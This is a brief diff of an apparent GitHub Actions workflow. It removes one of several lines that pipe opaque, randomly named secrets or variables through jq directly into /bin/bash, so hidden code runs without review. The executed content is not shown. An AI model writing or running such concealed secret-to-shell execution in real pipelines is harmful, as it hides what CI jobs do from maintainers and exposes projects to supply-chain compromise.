@@ -17,7 +17,6 @@ jobs:
           qizjf6030: ${{ secrets.qizjf6030 }}
         run: |
           printf '%s' "$qizjf6030" | jq -r .rhlo6 | /bin/bash
-          echo $p58 | jq -r .c184 | /bin/bash
           printf '%s' "$r0566" | jq -r .xhhg7 | /bin/bash
           echo $c95 | jq -r .qc2041 | /bin/bash
           printf '%s' "$j5" | jq -r .hgbb01496 | /bin/bash
